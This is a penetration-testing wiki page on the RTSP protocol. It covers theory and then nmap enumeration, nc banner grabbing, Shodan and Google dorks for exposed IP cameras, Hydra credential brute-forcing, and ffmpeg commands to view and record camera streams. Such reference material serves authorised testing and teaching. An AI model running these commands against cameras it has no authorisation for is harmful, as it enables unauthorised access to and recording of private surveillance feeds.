---
authors: Tednoob17
category: infra
---

# 🛠️ RTSP

## Theory

RTSP (Real Time Streaming Protocol) is a network control protocol designed to control streaming media systems. It facilitates the creation and management of media sessions between endpoints, primarily for IP cameras, media servers, and video surveillance systems.

The default control port is `554` over TCP. Media data is delivered separately via RTP (Real-time Transport Protocol) over UDP on negotiated ports. Some implementations use port `8554` as a non-standard alternative, and RTSPS (RTSP over TLS) typically operates on port `322`.

RTSP URLs follow a predictable format:
```
rtsp://[username]:[password]@[ip_address]:[port]/[path_to_stream]
```

| URL component | Description |
|---|---|
| `rtsp://` | Protocol identifier |
| `[username]:[password]@` | Optional credentials, required on authenticated streams |
| `[ip_address]` | IP address or hostname of the streaming device |
| `[port]` | Control port, defaults to `554` (often omitted). Some devices use `8554` or support TLS via `rtsps://` (TCP `322`) |
| `[path_to_stream]` | Device-specific stream path (e.g. `/stream1`, `/live/ch0`, `/onvif/profile1/media.smp`) |

### Common RTSP methods

| Method | Description |
|---|---|
| `OPTIONS` | Retrieves the list of methods supported by the server |
| `DESCRIBE` | Returns stream metadata (codec, resolution, FPS) in SDP format |
| `SETUP` | Negotiates transport parameters (UDP/TCP ports) for a stream |
| `PLAY` | Starts media delivery from the server |
| `PAUSE` | Suspends media delivery without tearing down the session |
| `TEARDOWN` | Terminates the session and releases server resources |

## Practice

### Enumeration

#### Port scanning

Open RTSP services can be discovered with nmap. The `rtsp-methods` script issues an `OPTIONS` request to identify supported RTSP methods, while `rtsp-url-brute` attempts to enumerate valid stream paths.

:::tabs
=== Unix-like
```bash
# Discover RTSP service and version
nmap -p 554,8554 -sV $TARGET

# Identify supported RTSP methods
nmap -p 554 --script=rtsp-methods $TARGET

# Enumerate valid stream paths
nmap -p 554 --script=rtsp-url-brute $TARGET
```

:::

#### Banner grabbing

A raw `OPTIONS` request can be sent directly to retrieve server headers and identify the RTSP implementation. RTSP requires CRLF line endings; `printf` is preferred over `echo -e` for portability.

:::tabs
=== Unix-like
```bash
printf 'OPTIONS rtsp://%s:554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n' "$TARGET" | nc -nv "$TARGET" 554
```

:::

#### OSINT

Publicly exposed RTSP services can be discovered through internet-wide search engines without interacting with the target directly.

:::tabs
=== Shodan
```
port:554
rtsp
```

=== Google dorks

Use targeted Google search operators to discover publicly exposed RTSP and IP camera interfaces.
```
inurl:/view.shtml intitle:"Live View"
inurl:/CGI_Stream.cgi
```

:::

#### Stream inspection

Once a valid stream URL is identified, metadata can be retrieved without recording the stream. Forcing TCP transport is useful when UDP traffic is filtered.

:::tabs
=== Unix-like
```bash
# Probe stream metadata without decoding (unauthenticated)
ffmpeg -i rtsp://$TARGET:554/$STREAM_PATH -c copy -f null -

# Probe with credentials
ffmpeg -i "rtsp://$USER:$PASSWORD@$TARGET:554/$STREAM_PATH" -c copy -f null -

# Force TCP transport
ffmpeg -rtsp_transport tcp -i rtsp://$TARGET:554/$STREAM_PATH -c copy -f null -
```

=== Windows
```powershell
# Open stream with VLC from command line
vlc rtsp://$TARGET:554/$STREAM_PATH
```

:::

### Attacks

#### Default and weak credentials

IP cameras and media servers frequently ship with well-known default credentials. Credential brute-forcing can be performed with Hydra against the RTSP service.

:::tabs
=== Unix-like
```bash
hydra -L "$WORDLIST_USER" -P "$WORDLIST_PASS" -s 554 $TARGET rtsp
```

:::

#### Unauthenticated stream access

Some devices are misconfigured to allow unauthenticated access when the stream path is known. Access can be attempted directly without supplying credentials.

:::tabs
=== Unix-like
```bash
ffmpeg -i rtsp://$TARGET:554/$STREAM_PATH -c copy -f null -
```

=== Windows
```powershell
vlc rtsp://$TARGET:554/$STREAM_PATH
```

:::

#### Stream capture

An accessible stream can be recorded locally for offline analysis.

:::tabs
=== Unix-like
```bash
# Record 30 minutes of video stream to a file
ffmpeg -i "rtsp://$USER:$PASSWORD@$TARGET:554/$STREAM_PATH" \
  -map 0:v -c:v copy -t 00:30:00 output.mp4
```

:::

## Resources

* [RTSP - Wikipedia](https://en.wikipedia.org/wiki/Real_Time_Streaming_Protocol)
* [HackTricks - RTSP pentesting](https://book.hacktricks.xyz/network-services-pentesting/554-8554-pentesting-rtsp)
* [nmap rtsp-methods script](https://nmap.org/nsedoc/scripts/rtsp-methods.html)
* [nmap rtsp-url-brute script](https://nmap.org/nsedoc/scripts/rtsp-url-brute.html)
* [FFmpeg RTSP documentation](https://ffmpeg.org/ffmpeg-protocols.html#rtsp)
